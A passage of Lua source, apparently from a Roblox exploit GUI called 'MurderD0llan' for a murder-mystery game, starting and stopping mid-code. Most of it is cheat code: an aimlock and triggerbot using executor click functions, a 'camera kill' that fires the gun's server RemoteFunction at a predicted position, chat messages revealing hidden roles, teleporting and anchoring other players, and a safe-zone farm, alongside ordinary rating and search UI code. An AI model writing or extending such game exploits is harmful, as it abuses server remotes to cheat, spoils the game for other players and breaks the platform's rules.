		--teleports next to selected player and reset localplayer
		localPlayer.Character:PivotTo(selectedplayerforGG.Character:GetPivot() * CFrame.new(2,0,0))
		wait(0.3)
		localPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
	end)


	local button = script.Parent.lookatmurder
	local indicator = button:FindFirstChild("Frame")

	local connectionV8

	local function getMurdererCharacter()
		local murderer = findMurderer()
		return murderer and murderer.Character
	end

	local function isValidPart(part)
		return part and part:IsA("BasePart")
	end

	local function lookAtMurderer()
		local character = localPlayer.Character
		local localPart = character and character:FindFirstChild("HumanoidRootPart")
		local murdererCharacter = getMurdererCharacter()
		local murdererPivot = murdererCharacter and murdererCharacter:GetPivot().Position

		if isValidPart(localPart) and murdererPivot then
			localPart.CFrame = CFrame.lookAt(localPart.Position, murdererPivot)
		end
	end

	button.MouseButton1Click:Connect(function()
		if connectionV8 then
			connectionV8:Disconnect()
			connectionV8 = nil
			if indicator then
				indicator.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Desactivado
			end
		else
			local murdererChar = getMurdererCharacter()
			local murdererRoot = murdererChar and murdererChar:FindFirstChild("HumanoidRootPart")

			if not isValidPart(murdererRoot) then
				errornotify("Murderer = NULL, try again.")
				return
			end

			connectionV8 = murdererRoot:GetPropertyChangedSignal("Position"):Connect(function()
				lookAtMurderer()
			end)

			if indicator then
				indicator.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Activado
			end
		end
	end)

	-----------
	local autoClickActive = false

	script.Parent.triggerbot.MouseButton1Click:Connect(function()
		if autoClickActive then
			autoClickActive = false
			script.Parent.triggerbot.Frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red
		else
			autoClickActive = true

			task.spawn(function()
				local Players = game:GetService("Players")
				local RunService = game:GetService("RunService")

				local player = Players.LocalPlayer
				local mouse = player:GetMouse()

				-- Asume que `findmurder` es una función definida en tu script:
				-- local function findmurder() ... end

				-- Activador manual

				-- Verifica si el ejecutor tiene las funciones necesarias
				local clickPress = mouse1press or (mouse1 and mouse1.down)
				local clickRelease = mouse1release or (mouse1 and mouse1.up)

				if not clickPress or not clickRelease then
					warn("mouse1press/mouse1release not available.")
					return
				end

				-- Control de frecuencia de clicks
				local CLICK_INTERVAL = 0.2 -- 5 clicks por segundo
				local lastClickTime = 0

				RunService.RenderStepped:Connect(function()
					if not autoClickActive then return end
					if not script.Parent then return end
					local target = mouse.Target
					if not target then return end

					local murder = findMurderer()
					if not murder then return end

					if target.Name == murder.Name then
						local now = tick()
						if now - lastClickTime >= CLICK_INTERVAL then
							lastClickTime = now
							clickPress()
							clickRelease()
						end
					end
				end)

			end)

			script.Parent.triggerbot.Frame.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- green
		end
	end)
	-------------------------------------


	task.spawn(function()
		local selectingKey = false
		local UserInputService = game:GetService("UserInputService")
		local button = FindButton("camera kill Murder - not selected key  ")
		local flashing = false
		local originalBGColor = button.BackgroundColor3
		local originalTextStroke = button.TextStrokeColor3
		local selectedKey = Enum.KeyCode.Unknown
		local function startKeySelection()
			if selectingKey then return end
			selectingKey = true
			button.Text = "  Press any key..."
			button.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
			flashing = true

			-- Flash stroke
			task.spawn(function()
				while flashing do
					button.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
					task.wait(0.5)
					button.TextStrokeColor3 = originalTextStroke
					task.wait(0.5)
				end
			end)
		end

		local function onInputBegan(input, gameProcessed)
			if selectingKey and not gameProcessed then
				if input.UserInputType == Enum.UserInputType.Keyboard then
					selectedKey = input.KeyCode
					local keyName = selectedKey.Name
					button:SetAttribute("SELECTED_KEY", keyName)
					button.Text = string.format("camera kill Murder - %s  ", keyName)
					selectingKey = false
					flashing = false
					button.BackgroundColor3 = originalBGColor
					button.TextStrokeColor3 = originalTextStroke
				end
			end
		end

		button.MouseButton1Click:Connect(startKeySelection)
		UserInputService.InputBegan:Connect(onInputBegan)
	end)

	local CKM = script.Parent.CKM
	local IsActiveCKM = false
	local IsActiveFrameCKM = SWKPButton.Frame
	local ConnectionForCKM

	local function getselectedkeyforCKM()
		local button = FindButtonWithMatchedString("camera kill Murder -")
		--
		if button:GetAttribute("SELECTED_KEY") then
			return Enum.KeyCode[button:GetAttribute("SELECTED_KEY")]
		else
			return Enum.KeyCode.Unknown
		end
	end

	CKM.MouseButton1Click:Connect(function()
		if not IsActiveCKM then
			IsActiveCKM = true
			IsActiveFrameCKM.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
			ConnectionForCKM = UserInputService.InputBegan:Connect(function(input, gameProcessed)
				if input.KeyCode == getselectedkeyforCKM() and not gameProcessed then
					if findSheriff() ~= localplayer then 
						return 
					end

					local murderer = findMurderer()
					if not murderer then
						return
					end

					local murdererHRP = murderer.Character:FindFirstChild("HumanoidRootPart")
					if not murdererHRP then

						return
					end
					-- shoot a ray from player to murderer
					local origin = localplayer.Character.HumanoidRootPart.Position
					local direction = (Vector3.new(murdererHRP.Position.X, origin.Y, murdererHRP.Position.Z) - origin).unit * 1000
					local params = RaycastParams.new()

					local raycastResult = workspace:Raycast(origin, direction, params)
					if raycastResult then
						if raycastResult.Instance == murdererHRP then

							local predictedPosition = PredictShootPosition(murderer, shootOffset)
							--MOVE CAMERA TO PREDICT POSITION
							local camera = game.Workspace.CurrentCamera
							local OLDPOSC = camera.CFrame.Position
							camera.CFrame = CFrame.new(predictedPosition, murdererHRP.Position)
							wait(0.3)
							local args = {
								[1] = 1,
								[2] = predictedPosition,
								[3] = "AH2"
							}


							localplayer.Character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(unpack(args))
							wait(0.2)
							camera.CFrame = CFrame.new(OLDPOSC)
						end
					end
				end
			end)
		else
			if ConnectionForCKM then
				IsActiveCKM = false
				IsActiveFrameCKM.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
				ConnectionForCKM:Disconnect()
				ConnectionForCKM = nil
			end
		end
	end)
end;
task.spawn(C_132);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_feedback.RatingFrame.RatingSystem
local function C_15b()
	local script = G2L["15b"];
	local frame = script.Parent
	local totalStars = 5
	local selectedRating = 0

	local feedbackBox = frame.Parent:FindFirstChild("FeedBackBOX")
	local starCountLabel = frame.Parent:FindFirstChild("starcount")
	-- Sound setup
	local ratingSound = Instance.new("Sound")
	ratingSound.SoundId = "rbxassetid://8055713313"
	ratingSound.Volume = 1
	ratingSound.Parent = frame

	-- Rating metadata
	local ratingData = {
		[0] = {
			text = "Zero Stars (0 - Default)",
			color = Color3.fromRGB(128, 128, 128),
			placeholder = "Put your thoughts, ideas, or whatever you want here as long as it's related to the script's operation or something else..."
		},
		[1] = {
			text = "Very Bad (1 star)",
			color = Color3.fromRGB(255, 0, 0),
			placeholder = "Something clearly went wrong. What was the worst part? Be specific so we can fix it!"
		},
		[2] = {
			text = "Bad (2 stars)",
			color = Color3.fromRGB(255, 85, 0),
			placeholder = "Not great, not terrible. What made it disappointing or hard to use?"
		},
		[3] = {
			text = "Okay (3 stars)",
			color = Color3.fromRGB(255, 170, 0),
			placeholder = "It worked okay! Tell us what was average and what could make it awesome."
		},
		[4] = {
			text = "Good (4 stars)",
			color = Color3.fromRGB(100, 200, 100),
			placeholder = "Great! Tell us what stood out and what we can polish further."
		},
		[5] = {
			text = "Excellent (5 stars)",
			color = Color3.fromRGB(0, 170, 255),
			placeholder = "Amazing! Share what you loved most or any extra thoughts you have!"
		},
	}

	-- Sound speeds for each rating
	local speedByRating = {
		[0] = 0,
		[1] = 0.6,
		[2] = 0.7,
		[3] = 0.8,
		[4] = 0.9,
		[5] = 1.0,
	}


	local Debris = game:GetService("Debris")



	-- Update visual stars and UI
	local function updateRatingDisplay(rating)
		local color = ratingData[rating] and ratingData[rating].color or Color3.new(1,1,1)

		for i = 1, totalStars do
			local star = frame:FindFirstChild("star" .. i)
			if star then
				-- Fill all if special sixth star is active
				star.BackgroundColor3 = (i <= rating or (specialSixthStar and i == totalStars)) and color or Color3.fromRGB(200, 200, 200)
			end
		end

		if starCountLabel then
			local info = ratingData[rating]
			starCountLabel.Text = info.text
			starCountLabel.TextColor3 = info.color
		end

		if feedbackBox then
			feedbackBox.PlaceholderText = ratingData[rating].placeholder
		end
		-- Play rating sound if valid
		if speedByRating[rating] then
			ratingSound.PlaybackSpeed = speedByRating[rating]
			ratingSound:Play()
		end
	end

	-- Handle star click
	local function handleStarClick(index)

		selectedRating = index
		script.Parent.Parent:SetAttribute("rate", tonumber(index))
		updateRatingDisplay(selectedRating)
		print("⭐ Rating given:", selectedRating)
	end

	-- Connect all stars
	for i = 1, totalStars do
		local star = frame:FindFirstChild("star" .. i)
		if star then
			-- Left click
			star.MouseButton1Click:Connect(function()
				handleStarClick(i)
			end)

			-- Right click to reset
			star.MouseButton2Click:Connect(function()
				selectedRating = 0
				specialSixthStar = false
				updateRatingDisplay(0)
				print("🔄 Rating reset to zero")
			end)
		end
	end

	-- Init
	updateRatingDisplay(0)

end;
task.spawn(C_15b);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_search.LocalScript
local function C_16f()
	local script = G2L["16f"];
	local SearchSystem = {}

	-- UI Element References
	local Template = script.Parent:FindFirstChild("Template")
	local ContentArea = script.Parent.Parent
	local SearchResultsContainer = script.Parent
	local StatusLabelTemplate = script.Parent:FindFirstChild("TextLabel") -- Expected to be Instance_1_9369

	-- Constants
	local MIN_SEARCH_TEXT_LENGTH = 3
	local STATUS_MESSAGE_NAME = "StatusMessageLabel"
	local SEARCH_RESULT_PREFIX = "SearchResult_"
	local OLD_PAGE = nil

	-- Initial Checks for critical components
	if not Template then
		warn("SearchSystem: Template frame not found. Search functionality will be severely limited.")
	end
	if Template and (not Template:FindFirstChild("ApplyInformation") or not Template.ApplyInformation:IsA("ModuleScript")) then
		warn("SearchSystem: ApplyInformation ModuleScript not found within the Template. Search results cannot be processed.")
	end
	if not ContentArea then
		warn("SearchSystem: ContentArea not found. Cannot search for items.")
	end
	if not SearchResultsContainer or not SearchResultsContainer:IsA("ScrollingFrame") then
		warn("SearchSystem: SearchResultsContainer is not a ScrollingFrame. Results cannot be displayed.")
	end
	if not StatusLabelTemplate then
		warn("SearchSystem: StatusLabelTemplate (TextLabel child of ALT_page_search) not found. Status messages cannot be displayed.")
	end


	-- Helper function to clear previous search results and status messages
	local function ClearPreviousItems()
		if not SearchResultsContainer then return end
		StatusLabelTemplate.Visible = false
		local childrenToClear = SearchResultsContainer:GetChildren()
		for i = #childrenToClear, 1, -1 do
			local child = childrenToClear[i]
			if child then
				if (child:IsA("Frame") and child.Name:match("^" .. SEARCH_RESULT_PREFIX)) or 
					(child:IsA("TextLabel") and child.Name == STATUS_MESSAGE_NAME) then
					child:Destroy()
				end
			end
		end
	end

	local function UpdateCanvaSizeFromScrollingFrame()
		local scrollingFrame = SearchResultsContainer
		if scrollingFrame and scrollingFrame:IsA("ScrollingFrame") then
			scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, scrollingFrame.UIListLayout.AbsoluteContentSize.Y + 110)
		else
			warn("SearchSystem: SearchResultsContainer is not a ScrollingFrame, cannot update CanvasSize.")
		end
	end

	-- Helper function to show status messages (errors, no results, etc.)
	local function ShowStatusMessage(messageText, isError)
		local previousStatusMessage = SearchResultsContainer:FindFirstChild(STATUS_MESSAGE_NAME)
		if previousStatusMessage then
			previousStatusMessage:Destroy()
		end

		if not StatusLabelTemplate then
			warn("SearchSystem: Cannot show status message because StatusLabelTemplate is missing. Message: " .. messageText)
			return
		end
		if not SearchResultsContainer then
			warn("SearchSystem: Cannot show status message because SearchResultsContainer is missing. Message: " .. messageText)
			return
		end

		local messageLabel = StatusLabelTemplate:Clone()
		messageLabel.Name = STATUS_MESSAGE_NAME
		messageLabel.Text = messageText
		if isError then
			messageLabel.TextColor3 = Color3.fromRGB(255, 50, 50) -- Red for errors
		else
			messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200) -- A neutral/info color
		end
		messageLabel.Visible = true
		messageLabel.Parent = SearchResultsContainer
	end

	function SearchSystem.Search(searchText, filterType)
		ClearPreviousItems()

		-- Ensure search results page is visible and others are hidden at the start of a new search
		if SearchResultsContainer then
			SearchResultsContainer.Visible = true
		end
		if ContentArea then
			for _, childInContentArea in ContentArea:GetChildren() do
				if childInContentArea:IsA("ScrollingFrame") and childInContentArea ~= SearchResultsContainer then
					if childInContentArea.Visible == true then
						childInContentArea.Visible = false
						SearchResultsContainer:SetAttribute("OLD_PAGE", childInContentArea.Name)
					end
				end
			end
		end

		if not Template or not ContentArea or not SearchResultsContainer then
			ShowStatusMessage("Search system critical components missing. Please check setup.", true)
			return
		end

		local lowerSearchText = ""
		local trimmedSearchText = searchText and searchText:match("^%s*(.-)%s*$") or ""

		if not filterType or filterType == "" then
			if trimmedSearchText == "" then
				ShowStatusMessage("Search text cannot be empty or only spaces.", true)
				return
			end
			if #trimmedSearchText < MIN_SEARCH_TEXT_LENGTH then
				ShowStatusMessage("Search text must be at least " .. MIN_SEARCH_TEXT_LENGTH .. " characters long.", true)
				return
			end
			lowerSearchText = string.lower(trimmedSearchText)
		else 
			lowerSearchText = string.lower(trimmedSearchText) 
		end

		local resultsFound = false
		local resultsCount = 0

		for _, pageInstance in ContentArea:GetChildren() do
			if pageInstance:IsA("ScrollingFrame") and pageInstance ~= SearchResultsContainer then
				local pageName = pageInstance.Name
				--EXCLUDE ANY LETTER
				local inWhatPageNumber = tonumber(string.match(pageName, "%d+")) or 0
				for _, itemInPage in pageInstance:GetChildren() do
					local itemPassesFilter = false
					if not filterType or filterType == "" then
						itemPassesFilter = true 
					else
						if filterType == "toggle" then
							itemPassesFilter = (itemInPage:FindFirstChildOfClass("Frame") ~= nil)
						elseif filterType == "button_with_box" then
							itemPassesFilter = (itemInPage:FindFirstChildOfClass("TextBox") ~= nil)
						elseif filterType == "change_button" then
							local innerButton = itemInPage:FindFirstChildOfClass("TextButton")
							itemPassesFilter = (innerButton ~= nil and innerButton ~= itemInPage) 
						end
					end

					if not itemPassesFilter then
						continue 
					end

					local textContent = nil
					if itemInPage:IsA("TextButton") then
						textContent = itemInPage.Text
					else
						local textLabelChild = itemInPage:FindFirstChildOfClass("TextLabel")
						if textLabelChild then
							textContent = textLabelChild.Text
						end
					end

					local itemIsMatch = false
					if filterType and filterType ~= "" and (lowerSearchText == "") then 
						itemIsMatch = true
					elseif lowerSearchText ~= "" then
						if textContent and textContent ~= "" and string.find(string.lower(textContent), lowerSearchText, 1, true) then
							itemIsMatch = true
						end
					elseif not filterType or filterType == "" then
						itemIsMatch = false 
					end

					if itemIsMatch then
						resultsFound = true
						resultsCount += 1

						UpdateCanvaSizeFromScrollingFrame()
						task.spawn(function()
							local message = ""
							if filterType and filterType ~= "" then
								if lowerSearchText ~= "" then
									message = string.format("Found %d result(s) with filter '%s' for text '%s'.", resultsCount, filterType, trimmedSearchText)
								else
									message = string.format("Found %d result(s) with filter '%s'.", resultsCount, filterType)
								end
							else
								message = string.format("Found %d result(s) for '%s'.", resultsCount, trimmedSearchText)
							end
							StatusLabelTemplate.Visible = true
							StatusLabelTemplate.Text = message
						end)
						local newResultDisplay = Template:Clone()
						newResultDisplay.Name = SEARCH_RESULT_PREFIX .. itemInPage.Name
						newResultDisplay.Parent = SearchResultsContainer
						newResultDisplay.Visible = true

						local clonedApplyInfoModuleScript = newResultDisplay:FindFirstChild("ApplyInformation")
						if clonedApplyInfoModuleScript and clonedApplyInfoModuleScript:IsA("ModuleScript") then
							local ClonedApplyInformation = require(clonedApplyInfoModuleScript)
							local success, err = pcall(ClonedApplyInformation.Apply, itemInPage.Name, inWhatPageNumber, nil, itemInPage)
							if not success then
								warn("SearchSystem: Error calling ApplyInformation.Apply for item '" .. itemInPage.Name .. "': " .. tostring(err))
								newResultDisplay:Destroy() 
							end
						else
							warn("SearchSystem: ApplyInformation module not found in cloned template for item '" .. itemInPage.Name .. "'.")
							newResultDisplay:Destroy() 
						end

						-- Add ViewInPage button functionality
						local viewInPageButton = newResultDisplay:FindFirstChild("ViewInPage")
						if viewInPageButton and viewInPageButton:IsA("TextButton") then
							viewInPageButton.MouseButton1Click:Connect(function()
								if not SearchResultsContainer or not ContentArea or not pageInstance or not itemInPage or not itemInPage.Parent then
									warn("SearchSystem: Missing components for ViewInPage action. Item: " .. (itemInPage and itemInPage.Name or "nil") .. ", Page: " .. (pageInstance and pageInstance.Name or "nil"))
									return
								end

								-- 1. Hide SearchResultsContainer
								SearchResultsContainer.Visible = false

								-- 2. Show the original pageInstance and hide others in ContentArea
								pageInstance.Visible = true -- Show the target page first
								for _, childInContentArea in ContentArea:GetChildren() do
									if childInContentArea:IsA("ScrollingFrame") then
										if childInContentArea ~= pageInstance and childInContentArea ~= SearchResultsContainer then
											childInContentArea.Visible = false
										end
									end
								end

								-- 3. Scroll pageInstance to itemInPage
								if itemInPage.Parent == pageInstance then
									-- Calculate Y position of the item's top edge within the canvas's coordinate system
									local itemAbsoluteYOnCanvas = itemInPage.AbsolutePosition.Y - pageInstance.AbsolutePosition.Y + pageInstance.CanvasPosition.Y

									local viewPortHeight = pageInstance.AbsoluteSize.Y
									local itemHeight = itemInPage.AbsoluteSize.Y
									-- Calculate desired CanvasPosition.Y to center the item
									local desiredCanvasPositionY = itemAbsoluteYOnCanvas - (viewPortHeight / 2) + (itemHeight / 2)

									local absoluteCanvasHeight = pageInstance.AbsoluteCanvasSize.Y

									if viewPortHeight > 0 then
										desiredCanvasPositionY = math.clamp(desiredCanvasPositionY, 0, math.max(0, absoluteCanvasHeight - viewPortHeight))
									else 
										desiredCanvasPositionY = 0 -- Fallback if viewport has no height
									end

									pageInstance.CanvasPosition = Vector2.new(pageInstance.CanvasPosition.X, desiredCanvasPositionY)
								else
									warn("SearchSystem: itemInPage '" .. itemInPage.Name .. "' is no longer parented to pageInstance '" .. pageInstance.Name .. "' when trying to scroll.")
								end
							end)
						end
					end
				end
			end
		end


		if not resultsFound then
			if StatusLabelTemplate.Visible == true then
				StatusLabelTemplate.Visible = false
			end
			local message
			if filterType and filterType ~= "" then
				if lowerSearchText ~= "" then
					message = "No items found for filter '" .. filterType .. "' matching text '" .. trimmedSearchText .. "'."
				else
					message = "No items found for filter: " .. filterType .. "."
				end
			else
				message = "No results found for '" .. trimmedSearchText .. "'."
			end
			ShowStatusMessage(message, false) 
		end
	end



	local searchBox = script.Parent.Parent.Parent.searchHere
	local searchPage = searchBox.Parent.ContentArea.ALT_page_search

	local lastText = ""
	local debounce = false
	local MIN_SEARCH_LENGTH = 1

	local function onSearchTextChanged()
		if debounce then return end
		debounce = true

		task.delay(0.1, function() -- Pequeño retraso para permitir que el usuario termine de escribir
			local currentText = searchBox.Text
			if currentText == lastText then
				debounce = false
				return
			end
			lastText = currentText

			if currentText == "" or #currentText < MIN_SEARCH_LENGTH then
				searchPage.Visible = false
				searchPage.Parent[searchPage:GetAttribute("OLD_PAGE")].Visible = true
			else
				searchPage.Visible = true
				local success, err = pcall(function()
					SearchSystem.Search(currentText)
				end)
				if not success then
					warn("[SearchSystem Error]: " .. tostring(err))
				end
			end
			debounce = false
		end)
	end

	searchBox:GetPropertyChangedSignal("Text"):Connect(onSearchTextChanged)

end;
task.spawn(C_16f);
-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_5.HandlerV5
local function C_190()
	local script = G2L["190"];
	local contenedorBusqueda = script.Parent -- Cambia esto a la ruta del objeto donde quieres buscar
	local Notificaciones = {
		Error = "rbxassetid://4041673253",
		Aviso = "rbxassetid://4026367629",
		Correcto = "rbxassetid://4094488012",
	}


	local Notification_Service = require(script.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

	local function errornotify(text)
		Notification_Service.ShowNotification({
			title = "Error / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Error,
			theme = "Error"
		})
	end

	local function sucessnotify(text)
		Notification_Service.ShowNotification({
			title = "Success / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Correcto,
			theme = "Success"
		})
	end

	local function warningnotify(text)
		Notification_Service.ShowNotification({
			title = "Warning / MurderD0llan",
			text = text,
			soundOnOpen = Notificaciones.Aviso,
			theme = "Warning"
		})
	end

	local localplayer = game:GetService("Players").LocalPlayer
	local Players = game:GetService("Players")
	local playerData = {}
	-- Helpers
	local Help_Functions = {
		findMurderer = function()
			for _, i in ipairs(Players:GetPlayers()) do
				if i.Backpack:FindFirstChild("Knife") or (i.Character and i.Character:FindFirstChild("Knife")) then
					return i
				end
			end
			for player, data in pairs(playerData) do
				if data.Role == "Murderer" and Players:FindFirstChild(player) then
					return Players:FindFirstChild(player)
				end
			end
			for _, i in ipairs(Players:GetPlayers()) do
				if i.Backpack:FindFirstChild("knife") or (i.Character and i.Character:FindFirstChild("knife")) then
					return i
				end
			end

			return nil
		end,

		findSheriff = function()
			for _, i in ipairs(Players:GetPlayers()) do
				if i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun")) then
					return i
				end
			end
			for player, data in pairs(playerData) do
				if data.Role == "Sheriff" and Players:FindFirstChild(player) then
					return Players:FindFirstChild(player)
				end
			end
			return nil
		end,

		findSheriffThatsNotMe = function()
			for _, i in ipairs(Players:GetPlayers()) do
				if i ~= localplayer and (i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun"))) then
					return i
				end
			end
			for player, data in pairs(playerData) do
				if data.Role == "Sheriff" and Players:FindFirstChild(player) and Players:FindFirstChild(player) ~= localplayer then
					return Players:FindFirstChild(player)
				end
			end
			return nil
		end
	}

	function chatMessage(str)
		str = tostring(str)
		game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(str)
	end

	local function MouseButton1Click(TextToSearch: string, Function)
		for i, v in pairs(contenedorBusqueda:GetChildren()) do
			if v:IsA("TextButton") and string.find(string.lower(v.Text), string.lower(TextToSearch)) then
				if game:GetService("RunService"):IsStudio() then
					print("[MurderD0llan]: "..TextToSearch.." - Found")
				end
				v.MouseButton1Click:Connect(Function)
			end
		end
	end

	MouseButton1Click("tell Sherrif And Murderer In Chat", function()
		local MessageToSay = "The Sheriff is "..(Help_Functions.findSheriff().Name or "none")..", and the murder is: "..(Help_Functions.findMurderer().Name or "none").."."
		chatMessage(MessageToSay)
	end)

	MouseButton1Click("God Mode", function()
		local character = localplayer.Character
		if not character then return end

		local humanoid = character:FindFirstChildOfClass("Humanoid")
		local rootPart = character:FindFirstChild("HumanoidRootPart")

		if humanoid and rootPart then
			local deathPosition = rootPart.Position

			-- Escuchar el respawn
			localplayer.CharacterAdded:Once(function(newChar)
				local newRoot = newChar:WaitForChild("HumanoidRootPart", 5)
				if newRoot then
					newRoot.CFrame = CFrame.new(deathPosition + Vector3.new(0, 5, 0)) -- +5 para evitar atascos
				end
			end)

			-- Forzar muerte
			humanoid:ChangeState(Enum.HumanoidStateType.Dead)
		end
	end)


	-------------------




	-- Botón de activación
	local OnNewMurderOrSheriff = script.Parent.tellblueandredinchat
	local IsActiveONMOSFrame = OnNewMurderOrSheriff.Frame

	-- Estado del detector
	local IsActiveONMOS = false
	local currentMurderer = nil
	local currentSheriff = nil

	-- Función para revisar cambios
	local function startMonitoringRoles()
		print("[DEBUG] Inicio del monitoreo de roles...")
		while IsActiveONMOS do
			local newMurderer = Help_Functions.findMurderer()
			local newSheriff = Help_Functions.findSheriff()

			if newMurderer ~= currentMurderer then
				currentMurderer = newMurderer
				print("[DEBUG] Nuevo Murderer detectado:", currentMurderer and currentMurderer.Name or "Ninguno")
				chatMessage("New Murderer: "..newSheriff and currentSheriff.Name or "none")
			end

			if newSheriff ~= currentSheriff then
				currentSheriff = newSheriff
				print("[DEBUG] Nuevo Sheriff detectado:", currentSheriff and currentSheriff.Name or "Ninguno")
				chatMessage("New Sherrif / Hero: "..newSheriff and currentSheriff.Name or "none")
			end

			task.wait(1) -- chequeo cada 1 segundo (puedes ajustar)
		end
		print("[DEBUG] Monitoreo detenido.")
	end

	-- Click del botón
	OnNewMurderOrSheriff.MouseButton1Click:Connect(function()
		IsActiveONMOS = not IsActiveONMOS
		IsActiveONMOSFrame.BackgroundColor3 = IsActiveONMOS and Color3.fromRGB(50, 200, 50) or Color3.fromRGB(200, 50, 50)
		print("[DEBUG] Estado del sistema ONMOS:", IsActiveONMOS and "ACTIVO" or "INACTIVO")

		if IsActiveONMOS then
			currentMurderer = Help_Functions.findMurderer()
			currentSheriff = Help_Functions.findSheriff()
			task.spawn(startMonitoringRoles)
		end
	end)



	-- UI y estado
	local BringMurder = script.Parent:WaitForChild("bringmurderclientsided")
	local BringSheriff = script.Parent:WaitForChild("bringsheriffclientsided")

	local BMFrame = BringMurder:WaitForChild("Frame")
	local BSFrame = BringSheriff:WaitForChild("Frame")

	local IsActiveBM = false
	local IsActiveBS = false

	local ColorOn = Color3.fromRGB(0, 255, 0)
	local ColorOff = Color3.fromRGB(255, 0, 0)

	-- Referencias actuales a los HRPs que anclamos
	local AnchoredHRPs = {}

	local function updateFrameColor()
		BMFrame.BackgroundColor3 = IsActiveBM and ColorOn or ColorOff
		BSFrame.BackgroundColor3 = IsActiveBS and ColorOn or ColorOff
	end

	local function bringAndAnchorPlayer(player)
		if player and player.Character then
			local hrp = player.Character:FindFirstChild("HumanoidRootPart")
			local myHRP = localplayer.Character and localplayer.Character:FindFirstChild("HumanoidRootPart")
			if hrp and myHRP then
				hrp.CFrame = myHRP.CFrame * CFrame.new(3, 0, 0)
				hrp.Anchored = true
				AnchoredHRPs[player] = hrp
			end
		end
	end

	local function unanchorPlayer(player)
		local hrp = AnchoredHRPs[player]
		if hrp and hrp:IsDescendantOf(game) then
			hrp.Anchored = false
		end
		AnchoredHRPs[player] = nil
	end

	BringMurder.MouseButton1Click:Connect(function()
		IsActiveBM = not IsActiveBM
		updateFrameColor()

		local murderer = Help_Functions.findMurderer()

		if IsActiveBM then
			if murderer then
				bringAndAnchorPlayer(murderer)
			end
		else
			if murderer then
				unanchorPlayer(murderer)
			end
		end
	end)

	BringSheriff.MouseButton1Click:Connect(function()
		IsActiveBS = not IsActiveBS
		updateFrameColor()

		local sheriff = Help_Functions.findSheriffThatsNotMe()

		if IsActiveBS then
			if sheriff then
				bringAndAnchorPlayer(sheriff)
			end
		else
			if sheriff then
				unanchorPlayer(sheriff)
			end
		end
	end)

	---------------


	local Players = game:GetService("Players")
	local RunService = game:GetService("RunService")
	local localplayer = Players.LocalPlayer

	local SafeZoneButton = script.Parent:WaitForChild("safezonefarm")
	local SafeZoneFrame = SafeZoneButton:WaitForChild("Frame")

	local IsInSafeZone = false
	local SafeZoneBase = nil
	local TextSheriffPart, TextMurderPart, ExitPart


	local ColorOn = Color3.fromRGB(0, 255, 0)
	local ColorOff = Color3.fromRGB(255, 0, 0)

	-- Funciones para encontrar roles
	local function findMurderer()
		for _, i in ipairs(Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Knife") or (i.Character and i.Character:FindFirstChild("Knife")) then
				return i
			end
		end
		for player, data in pairs(playerData) do
			if data.Role == "Murderer" and Players:FindFirstChild(player) then
				return Players:FindFirstChild(player)
			end
		end
		return nil
	end

	local function findSheriff()
		for _, i in ipairs(Players:GetPlayers()) do
			if i.Backpack:FindFirstChild("Gun") or (i.Character and i.Character:FindFirstChild("Gun")) then
				return i
			end
		end
		for player, data in pairs(playerData) do
			if data.Role == "Sheriff" and Players:FindFirstChild(player) then
				return Players:FindFirstChild(player)
			end
		end
		return nil
	end

	local SafeZoneModule = require(script.Parent.Parent.Parent.Parent.HelpModules.SafeZone)
	-- Crear zona segura
	local function createSafeZone()
		SafeZoneBase =  SafeZoneModule:MakeSafeZone()
		-- Nombres dinámicos
		coroutine.wrap(function()
			while IsInSafeZone do
				local sheriff = findSheriff()
				local murderer = findMurderer()
				SafeZoneBase.Murder.SurfaceGui.TextLabel.TextLabel.Text = "Sheriff: \n" .. (sheriff and sheriff.Name or "N/A")
				SafeZoneBase.Sheriff.SurfaceGui.TextLabel.TextLabel.Text = "Murderer: \n" .. (murderer and murderer.Name or "N/A")
				task.wait(1)
			end
		end)()
	end

	-- Eliminar zona
	local function removeSafeZone()
		SafeZoneModule:Destroy()
		IsInSafeZone = false
		SafeZoneBase = nil
	end

	-- TP local
	local function teleportToSafeZone()
		if not SafeZoneBase or not localplayer.Character then return end
		local hrp = localplayer.Character:FindFirstChild("HumanoidRootPart")
		if hrp then
			hrp.CFrame = SafeZoneBase.SpawnLocation.CFrame + Vector3.new(0, 5, 0)
		end
	end

	-- Toggle principal
	function toggleSafeZone(state)
		IsInSafeZone = state
		SafeZoneFrame.BackgroundColor3 = state and ColorOn or ColorOff

		if state then
			createSafeZone()
			task.wait(0.2)
			teleportToSafeZone()
		else
			removeSafeZone()
			localplayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
		end
	end

	-- Botón UI
	SafeZoneButton.MouseButton1Click:Connect(function()
		toggleSafeZone(not IsInSafeZone)
	end)


	--------------------------------

	task.spawn(function()
		local Players = game:GetService("Players")
		local localplayer = Players.LocalPlayer

		-- Notificación Service
		local Notification_Service = require(script.Parent.Parent.Parent.Parent:FindFirstChild("NotificationService"))

		local function errornotify(text)
			Notification_Service.ShowNotification({
				title = "Error / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Error,
				theme = "Error"
			})
		end

		local function sucessnotify(text)
			Notification_Service.ShowNotification({
				title = "Success / MurderD0llan",
				text = text,
				soundOnOpen = Notificaciones.Correcto,
				theme = "Success"
			})
		end

		local function warningnotify(text)
			Notification_Service.ShowNotification({
				title = "Warning / MurderD0llan",
				text = text,
